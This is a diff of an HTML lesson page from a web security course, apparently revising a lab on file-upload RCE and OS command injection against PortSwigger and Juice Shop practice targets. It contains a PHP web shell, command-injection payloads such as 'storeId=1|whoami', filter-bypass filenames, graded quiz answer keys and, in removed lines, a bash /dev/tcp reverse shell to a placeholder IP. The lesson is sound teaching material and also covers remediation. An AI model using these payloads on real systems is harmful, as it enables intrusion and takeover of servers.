-            <text x="712" y="151" fill="var(--color-warn)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">Caught by nc -lvnp 4444</text>
-            <text x="712" y="172" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">Interactive terminal session on box</text>
-          </svg>
-        </div>
-
-        <div class="prediction-prompt" style="margin-top:var(--space-4);">
-          <div class="prediction-prompt__question">🤔 A product stock checker sends <code>POST /product/stock</code> with <code>productId=1&amp;storeId=1</code>, and the server builds a shell string: <code>stockreport.pl &lt;productId&gt; &lt;storeId&gt;</code>. What value do you put into <code>storeId</code> to also run <code>whoami</code>?</div>
-          <div class="prediction-prompt__input-group">
-            <input type="text" class="prediction-prompt__input" placeholder="1..." />
-            <button type="button" class="prediction-prompt__btn">Reveal</button>
-          </div>
-          <div class="prediction-prompt__reveal" hidden>
-            <span class="prediction-prompt__reveal-label">Answer</span>
-            <p style="margin:0;"><code>1|whoami</code> (or <code>1;whoami</code> or URL-encoded <code>1%26whoami</code>). The pipe <code>|</code> tells <code>/bin/sh</code> to send the output of <code>stockreport.pl 1 1</code> into <code>whoami</code> and return <code>whoami</code>'s stdout in the response.</p>
-          </div>
-        </div>
-
-        <!-- Parser Trap: Raw & vs %26 vs | -->
-        <h3 id="form-ampersand-trap" style="margin-top:var(--space-4);">Parser Trap: Why Raw <code>&amp;</code> Fails in Form Bodies</h3>
-        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
-          <div class="comparison-card comparison-card--danger">
-            <div class="comparison-card__header">
-              <h3 class="comparison-card__title" id="raw-ampersand-trap">Raw <code>&amp;</code> Splits the HTTP Form</h3>
-              <span class="comparison-badge" style="color:var(--color-danger);">never hits shell</span>
-            </div>
-            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
-              <div class="terminal-window__body"><pre><code>productId=1&amp;storeId=1&amp;whoami
-→ HTTP parser splits on "&amp;"
-→ storeId = "1", extra param "whoami" = ""
-→ /bin/sh never sees "whoami"</code></pre></div>
-            </div>
-          </div>
-          <div class="comparison-card comparison-card--accent">
-            <div class="comparison-card__header">
-              <h3 class="comparison-card__title" id="pipe-or-encoded-amp">Use <code>|</code>, <code>;</code>, or <code>%26</code></h3>
-              <span class="comparison-badge" style="color:var(--color-accent);">reaches /bin/sh</span>
-            </div>
-            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
-              <div class="terminal-window__body"><pre><code>productId=1&amp;storeId=1|whoami
-productId=1&amp;storeId=1%26whoami
-→ HTTP parser keeps full value in storeId
-→ /bin/sh executes stockreport.pl 1 1|whoami</code></pre></div>
-            </div>
-          </div>
-        </div>
-
-        <div class="bento-card" style="margin-top:var(--space-3);border-left:3px solid var(--color-accent);">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
-            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 5 · Inject <code>whoami</code> &amp; Understand the Reverse Shell Upgrade</strong>
-            <span class="comparison-badge" style="color:var(--color-accent);">Command Execution</span>
-          </div>
-          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-3);display:flex;flex-direction:column;gap:var(--space-2);">
-            <li><strong>Solve the lab</strong>: Open <a href="https://portswigger.net/web-security/os-command-injection/lab-simple" target="_blank" rel="noopener noreferrer" style="color:var(--color-cyan);text-decoration:underline;">Lab: OS command injection, simple case ↗</a>, click <strong>Check stock</strong> on any product, send <code>POST /product/stock</code> to Burp Repeater, and inject <code>storeId=1|whoami</code>:
-              <div class="terminal-window" data-no-copy style="margin:var(--space-1) 0 0;">
-                <div class="terminal-window__header"><span class="terminal-window__title">Burp Repeater · POST /product/stock returns OS user (example username)</span></div>
-                <div class="terminal-window__body"><pre><code>POST /product/stock HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-
-productId=1&amp;storeId=1|whoami
-
-HTTP/1.1 200 OK
-
-peter-x7a9b2        # example PortSwigger container username; yours will vary</code></pre></div>
-              </div>
-            </li>
-            <li><strong>How pentesters upgrade to an interactive shell</strong>: Firing single commands inside Repeater gets old fast. On a real assessment (or over TryHackMe VPN starting in Week 8), you open a TCP listener on your attack box first:
-              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
-                <div class="terminal-window__header"><span class="terminal-window__title">bash · start netcat listener on your machine</span></div>
-                <div class="terminal-window__body"><pre><code>nc -lvnp 4444</code></pre></div>
-              </div>
-            </li>
-            <li>Then inject a reverse shell payload (URL-encoded when sent in a form parameter) so the target initiates an outbound TCP connection back to your IP and port:
-              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
-                <div class="terminal-window__header"><span class="terminal-window__title">bash · reverse shell one-liner (swap in your VPN/attack IP)</span></div>
-                <div class="terminal-window__body"><pre><code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></pre></div>
-              </div>
-            </li>
-          </ol>
-
-          <details class="thought-accordion" style="margin-top:var(--space-2);">
-            <summary>Why the reverse shell won't connect back from PortSwigger's hosted lab</summary>
-            <div class="thought-accordion__content">
-              <p style="margin:0;">PortSwigger's container lives on the public internet and can't route back to your private laptop IP behind NAT or campus Wi-Fi. On hosted web labs you read output in-band (like <code>1|whoami</code> above). Starting in Week 7–9 on TryHackMe's VPN, both your machine and the target share a private lab subnet, which is where you catch live reverse shells and escalate from <code>www-data</code> to <code>root</code>.</p>
-            </div>
-          </details>
-        </div>
-      </section>
-
-      <!-- Section 6: Write the Finding & How Developers Fix It -->
-      <section>
-        <h2 id="write-finding">6. Write the Finding &amp; How Developers Fix It</h2>
-        <p class="lab-lead">
-          When a web bug gives arbitrary operating system command execution, it jumps straight to Critical. Here's how to write the finding and fix both root causes on the server.
+          When an upload bug lets an attacker execute arbitrary server-side code on the host, severity jumps straight to Critical. Here's how to document the finding and eliminate every bypass vector at once.
         </p>
 
         <div class="diagram-card">
           <div class="diagram-card__title">
-            <span>FINDING: Unrestricted File Upload &amp; OS Command Injection Leading to RCE</span>
-            <span style="color:var(--color-danger);">Severity: Critical (CVSS 9.1 / 9.8)</span>
+            <span>FINDING: Unrestricted File Upload &amp; Filter Bypasses Leading to RCE</span>
+            <span style="color:var(--color-danger);">Severity: Critical (CVSS 9.1)</span>
           </div>
           <div class="table-container">
             <table class="data-table">
               <tbody>
-                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>Unrestricted File Upload and OS Command Injection Yielding Remote Code Execution</td></tr>
-                <tr><td><strong>Severity</strong></td><td>Critical · <code>CVSS 9.1</code> (authenticated upload RCE) / <code>CVSS 9.8</code> (unauthenticated OS command injection)</td></tr>
-                <tr><td><strong>Affected endpoints</strong></td><td><code>POST /my-account/avatar</code> + <code>GET /files/avatars/&lt;file&gt;</code>; <code>POST /product/stock</code> (<code>storeId</code> parameter)</td></tr>
-                <tr><td><strong>Steps to reproduce</strong></td><td>1. Upload <code>exploit.php</code> containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code> (spoofing <code>Content-Type: image/jpeg</code> or <code>filename="exploit.php%00.jpg"</code> where naive filters exist).<br />2. Request <code>GET /files/avatars/exploit.php?cmd=id</code> → returns the web server user's UID/username (e.g., <code>www-data</code>) and allows reading <code>/home/carlos/secret</code>.<br />3. On <code>POST /product/stock</code>, send <code>productId=1&amp;storeId=1|whoami</code> → OS username executes and returns in the response.</td></tr>
+                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>Unrestricted File Upload and Filter Bypass Yielding Remote Code Execution</td></tr>
+                <tr><td><strong>Severity</strong></td><td>Critical · <code>CVSS 9.1</code> (authenticated file upload leading to RCE as the web server user)</td></tr>
+                <tr><td><strong>Affected endpoints</strong></td><td><code>POST /my-account/avatar</code> + <code>GET /files/avatars/&lt;file&gt;</code> (and <code>GET /files/&lt;file&gt;</code> via path traversal)</td></tr>
+                <tr><td><strong>Steps to reproduce</strong></td><td>1. Upload <code>exploit.php</code> containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code> (bypassing naive filters via spoofed <code>Content-Type: image/jpeg</code>, null byte <code>filename="exploit.php%00.jpg"</code>, traversal <code>filename="..%2fexploit.php"</code>, two-stage <code>.htaccess</code> upload, or EXIF polyglot).<br />2. Request <code>GET /files/avatars/exploit.php?cmd=id</code> (or <code>/files/exploit.php</code>) → returns the web server user's UID/username (e.g., <code>www-data</code>) and allows reading <code>/home/carlos/secret</code>.</td></tr>
                 <tr><td><strong>Impact</strong></td><td>Arbitrary OS command execution on the application host as the web server user, exposing application secrets, database credentials, and internal network pivot paths.</td></tr>
-                <tr><td><strong>Remediation</strong></td><td>1. Validate uploads using a strict extension allowlist and real image parsing/re-encoding, rename files randomly server-side, and store uploads outside the web root with script execution disabled.<br />2. Never build shell command strings from user input; invoke parameterized OS APIs (<code>execFile</code> / <code>subprocess.run(..., shell=False)</code>) and validate IDs strictly as integers.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>Enforce a strict extension allowlist, verify and re-encode image bytes server-side, generate a random UUID/hex filename instead of trusting client <code>filename</code>, and store uploads outside the web root (or on object storage) with script execution disabled.</td></tr>
               </tbody>
             </table>
           </div>
@@ -717,34 +847,31 @@ peter-x7a9b2        # example PortSwigger container username; yours will vary</c
         <div class="comparison-grid" style="margin-top:var(--space-2);">
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title" id="upload-vulnerable-code">Vulnerable: Trusts Filename &amp; Shell String</h3>
+              <h3 class="comparison-card__title" id="upload-vulnerable-code">Vulnerable: Trusts Client Filename &amp; Executable Root</h3>
               <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">RCE</span>
             </div>
             <div class="terminal-window" data-no-copy style="margin:0;">
-              <div class="terminal-window__body"><pre><code>// PHP upload: saves client filename in executable web root
-move_uploaded_file($tmp, "/var/www/html/avatars/" . $name);
-
-// Node.js command: glues input into /bin/sh string
-exec("stockreport.pl " + productId + " " + storeId);</code></pre></div>
+              <div class="terminal-window__body"><pre><code>// Trusts client filename (allows .php, ..%2f, .htaccess, %00)
+// and writes straight inside Apache's executable web root:
+move_uploaded_file($tmp, "/var/www/html/files/avatars/" . $clientName);</code></pre></div>
             </div>
           </div>
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title" id="upload-secure-code">✅ Secure: Inert Storage &amp; No Shell</h3>
+              <h3 class="comparison-card__title" id="upload-secure-code">✅ Secure: Re-Encoded Image, Random Name &amp; Inert Storage</h3>
               <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.4);">locked down</span>
             </div>
             <div class="terminal-window" data-no-copy style="margin:0;">
-              <div class="terminal-window__body"><pre><code>// PHP upload: verify/re-encode image, random ID, non-exec path
+              <div class="terminal-window__body"><pre><code>// 1. Validate allowlist + re-encode real image bytes (strips EXIF PHP)
+// 2. Ignore client filename completely (stops %00, ..%2f, .htaccess)
+// 3. Store outside web root or disable PHP execution in upload dir:
 $safe = bin2hex(random_bytes(16)) . ".jpg";
-move_uploaded_file($tmp, "/srv/non_exec_uploads/" . $safe);
-
-// Node.js command: validate integer &amp; pass argument array (no shell)
-execFile("/usr/local/bin/stockreport.pl", [intId, intStore]);</code></pre></div>
+imagejpeg($reencoded, "/srv/non_exec_uploads/" . $safe);</code></pre></div>
             </div>
           </div>
         </div>
         <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin-top:var(--space-2);">
-          Look at the thread across Labs 05 and 06: <code>Content-Type</code>, <code>filename</code>, <code>BasketId</code>, and <code>storeId</code> all arrive from an untrusted client. Never let the server execute a filename, header, or string the user chose.
+          Notice how every attack today exploited trusting client-supplied data: <code>Content-Type</code>, <code>filename</code>, image metadata, or an unescaped URL path. Never let the server store a client-chosen name or execute files from a user-writable directory.
         </p>
       </section>
 
@@ -753,7 +880,7 @@ execFile("/usr/local/bin/stockreport.pl", [intId, intStore]);</code></pre></div>
         <div class="quiz-section__header">
           <h2 class="quiz-section__title" id="self-assessment">7. Quick Check</h2>
         </div>
-        <p class="lab-lead">Check every mechanism before moving to Week 7's network enumeration.</p>
+        <p class="lab-lead">Verify every file-upload and parser bypass mechanism before moving to Week 7's network enumeration.</p>
 
         <div class="quiz-card" data-question-id="lab06-q1">
           <div class="quiz-question">Q1: Why does requesting an uploaded <code>exploit.php</code> run OS commands on an Apache/PHP server, while requesting <code>cat.jpg</code> doesn't?</div>
@@ -766,17 +893,7 @@ execFile("/usr/local/bin/stockreport.pl", [intId, intStore]);</code></pre></div>
         </div>
 
         <div class="quiz-card" data-question-id="lab06-q2">
-          <div class="quiz-question">Q2: In Juice Shop, <code>GET /ftp/package.json.bak</code> returns <code>403</code>, while <code>GET /ftp/package.json.bak%2500.md</code> returns the backup file. Why is <code>%2500</code> needed instead of a single <code>%00</code>?</div>
-          <div class="quiz-options">
-            <button type="button" class="quiz-option" data-correct="false" data-feedback="Nothing is compressed or cached here. Express decodes the URL once before the route handler reads it.">A) <code>%2500</code> forces the browser to cache the <code>403</code> response locally.</button>
-            <button type="button" class="quiz-option" data-correct="true" data-feedback="Spot on. Express URL-decodes <code>%25</code> into <code>%</code> once, delivering <code>package.json.bak%00.md</code> to <code>fileServer.ts</code>. That ends in <code>.md</code> to pass the allowlist, then <code>cutOffPoisonNullByte()</code> strips from <code>%00</code> onward.">B) Express decodes <code>%25</code> to <code>%</code> once, handing <code>package.json.bak%00.md</code> to the filter (passes <code>.md</code> check) before <code>cutOffPoisonNullByte()</code> truncates at <code>%00</code>.</button>
-            <button type="button" class="quiz-option" data-correct="false" data-feedback="It's not an admin login trick. Two parsing steps inside the route handler disagree on the filename.">C) <code>%2500</code> automatically logs you in as administrator.</button>
-          </div>
-          <div class="quiz-feedback"></div>
-        </div>
-
-        <div class="quiz-card" data-question-id="lab06-q3">
-          <div class="quiz-question">Q3: An avatar upload endpoint only checks the HTTP <code>Content-Type</code> header inside the multipart request body. How do you upload a working PHP web shell?</div>
+          <div class="quiz-question">Q2: An avatar upload endpoint only checks the HTTP <code>Content-Type</code> header inside the multipart request body. How do you upload a working PHP web shell?</div>
           <div class="quiz-options">
             <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. Keep <code>filename=&quot;exploit.php&quot;</code> so Apache still runs it as PHP, and spoof <code>Content-Type: image/jpeg</code> in Burp Repeater so the naive filter waves it through.">A) Keep <code>filename="exploit.php"</code> and change the part's <code>Content-Type</code> header to <code>image/jpeg</code> in Burp Repeater.</button>
             <button type="button" class="quiz-option" data-correct="false" data-feedback="Renaming the file on disk to <code>.jpg</code> means Apache serves it as static image bytes instead of running it through PHP.">B) Rename the file to <code>exploit.jpg</code> without changing anything else.</button>
@@ -785,21 +902,31 @@ execFile("/usr/local/bin/stockreport.pl", [intId, intStore]);</code></pre></div>
           <div class="quiz-feedback"></div>
         </div>
 
-        <div class="quiz-card" data-question-id="lab06-q4">
-          <div class="quiz-question">Q4: When testing <code>POST /product/stock</code> with <code>application/x-www-form-urlencoded</code>, why did sending <code>productId=1&amp;storeId=1&amp;whoami</code> fail to run <code>whoami</code>?</div>
+        <div class="quiz-card" data-question-id="lab06-q3">
+          <div class="quiz-question">Q3: The server stops executing PHP inside <code>/files/avatars/</code> and strips literal <code>../</code> sequences from uploaded filenames. How do you still get your shell executed?</div>
           <div class="quiz-options">
-            <button type="button" class="quiz-option" data-correct="false" data-feedback="The shell accepts <code>&amp;</code> as a background separator, but the HTTP form parser consumed the raw <code>&amp;</code> before the shell ever saw it.">A) Linux shells don't recognize <code>&amp;</code> as a special character.</button>
-            <button type="button" class="quiz-option" data-correct="true" data-feedback="Exactly. In form-encoded bodies, raw <code>&amp;</code> separates key=value parameters, so <code>storeId</code> stayed <code>1</code>. Using <code>|</code>, <code>;</code>, or URL-encoded <code>%26</code> keeps the separator inside <code>storeId</code>.">B) The HTTP parser split on the raw <code>&amp;</code> as a new form field, so <code>whoami</code> never reached <code>storeId</code>; you need <code>|</code>, <code>;</code>, or <code>%26</code>.</button>
-            <button type="button" class="quiz-option" data-correct="false" data-feedback="In-band command injection doesn't require an outbound connection. It was an HTTP parameter parsing issue.">C) Because <code>whoami</code> requires an active reverse shell listener first.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Adding extra file extensions inside the same non-executable folder won't make Apache execute code there.">A) Rename the file to <code>exploit.php.txt</code> inside <code>/files/avatars/</code>.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Exactly. URL-encoding the slash as <code>..%2fexploit.php</code> slips past the literal <code>../</code> filter and lands the file in <code>/files/exploit.php</code>, where execution is still enabled.">B) Set <code>filename="..%2fexploit.php"</code> in Burp Repeater to bypass the literal <code>../</code> filter and write to <code>/files/exploit.php</code>.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Sending <code>Content-Type: text/plain</code> doesn't move the file out of the non-executable folder.">C) Change <code>Content-Type</code> to <code>text/plain</code>.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab06-q4">
+          <div class="quiz-question">Q4: PortSwigger Lab 3 accepted a single <code>%00</code> inside <code>filename="exploit.php%00.jpg"</code>, yet Juice Shop's <code>GET /ftp/package.json.bak%00.md</code> failed with <code>400 Bad Request</code> and required <code>%2500</code>. Why?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Nothing is compressed or cached here. The difference comes from whether the front-door URL router decodes the input before the filter sees it.">A) <code>%2500</code> forces the browser to cache the <code>403</code> response locally.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Spot on. The front-door HTTP router URL-decodes URL paths once on arrival, turning raw <code>%00</code> into a rejected null byte (<code>400 Bad Request</code>). Double-encoding as <code>%2500</code> delivers <code>%00</code> to the suffix guard; multipart headers aren't pre-decoded by the URL router.">B) The front-door HTTP router decodes URL paths once on arrival (turning raw <code>%00</code> into <code>400 Bad Request</code>), so URL paths need <code>%2500</code> to deliver <code>%00</code> past the router, whereas multipart body headers aren't pre-decoded by the URL router.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It's not an admin login trick. Two parsing layers decode the URL path differently.">C) <code>%2500</code> automatically logs you in as administrator.</button>
           </div>
           <div class="quiz-feedback"></div>
         </div>
 
         <div class="quiz-card" data-question-id="lab06-q5">
-          <div class="quiz-question">Q5: Which defense actually prevents file-upload RCE on a production server?</div>
+          <div class="quiz-question">Q5: Which defense stops every file-upload RCE bypass taught today (<code>Content-Type</code>, <code>%00</code>, <code>..%2f</code>, <code>.htaccess</code>, and EXIF polyglots)?</div>
           <div class="quiz-options">
-            <button type="button" class="quiz-option" data-correct="false" data-feedback="Blacklists miss alternative extensions (<code>.phtml</code>, <code>.phar</code>, <code>.php5</code>) and case or null-byte tricks.">A) Blacklist the <code>.php</code> extension by string match.</button>
-            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Verify real image content, rename with a random server-generated filename, and store uploads where no script interpreter can ever run.">B) Verify real file contents (or re-encode images), generate a random filename server-side, and store uploads in a non-executable directory.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Blacklists miss alternative extensions (<code>.phtml</code>, <code>.phar</code>, <code>.php5</code>) and <code>.htaccess</code> configuration overrides.">A) Blacklist the <code>.php</code> extension by string match.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Re-encoding real image bytes strips EXIF PHP payloads, random server-side filenames erase <code>%00</code> / <code>..%2f</code> / <code>.htaccess</code>, and inert storage guarantees nothing ever executes.">B) Verify and re-encode real image contents, generate a random filename server-side, and store uploads in a non-executable directory.</button>
             <button type="button" class="quiz-option" data-correct="false" data-feedback="Our working PHP web shell is only 29 bytes. A 1 MB size limit stops big files, not code execution.">C) Reject uploaded files larger than 1 MB.</button>
           </div>
           <div class="quiz-feedback"></div>
@@ -818,12 +945,12 @@ execFile("/usr/local/bin/stockreport.pl", [intId, intStore]);</code></pre></div>
         </div>
 
         <div class="quiz-card" data-question-id="lab06-q7"
-          data-expected-regex="^(/?ftp/)?package\.json\.bak%2500\.(md|pdf)$|^1(\||;|%3[bB]|%7[cC]|%26%26|%26|&&|\|\|)\s*whoami$"
-          data-solution-rationale="Either /ftp/package.json.bak%2500.md (double-encoded null byte to slip past Juice Shop's .md/.pdf filter) or 1|whoami / 1;whoami / 1%26whoami (command separator injected into storeId) cleanly demonstrates today's bypasses."
-          data-hint="Write either the Juice Shop null-byte path (/ftp/package.json.bak%2500.md) OR the storeId payload to run whoami (e.g. 1|whoami, 1;whoami, or 1%26whoami).">
-          <div class="quiz-question">Q7 [Payload]: Write either the full Juice Shop URL path that bypasses the <code>/ftp</code> extension filter to download <code>package.json.bak</code>, <strong>OR</strong> the <code>storeId</code> value that executes <code>whoami</code> in Section 5.</div>
+          data-expected-regex="^(exploit\.php%00\.(jpg|png)|(\.\.%2[fF])exploit\.php|AddType\s+application/x-httpd-php\s+\.[a-zA-Z0-9]+|(/?ftp/)?package\.json\.bak%2500\.(md|pdf))$"
+          data-solution-rationale="Any of today's four core bypass payloads passes: exploit.php%00.jpg (multipart null byte), ..%2fexploit.php (obfuscated path traversal), AddType application/x-httpd-php .l33t (.htaccess extension override), or /ftp/package.json.bak%2500.md (URL-path double-encoded null byte)."
+          data-hint="Enter one of today's bypasses: exploit.php%00.jpg, ..%2fexploit.php, AddType application/x-httpd-php .l33t, or /ftp/package.json.bak%2500.md.">
+          <div class="quiz-question">Q7 [Payload]: Write any <strong>one</strong> of today's file filter bypasses (null-byte filename, obfuscated path traversal filename, <code>.htaccess</code> directive, or Juice Shop URL-path null byte).</div>
           <div class="quiz-input-group">
-            <input type="text" class="quiz-input" placeholder="/ftp/package.json.bak%2500.md  or  1|whoami" spellcheck="false" autocomplete="off" />
+            <input type="text" class="quiz-input" placeholder="exploit.php%00.jpg  or  ..%2fexploit.php  or  /ftp/package.json.bak%2500.md" spellcheck="false" autocomplete="off" />
             <button type="button" class="quiz-submit-btn">Execute</button>
           </div>
           <div class="quiz-feedback"></div>
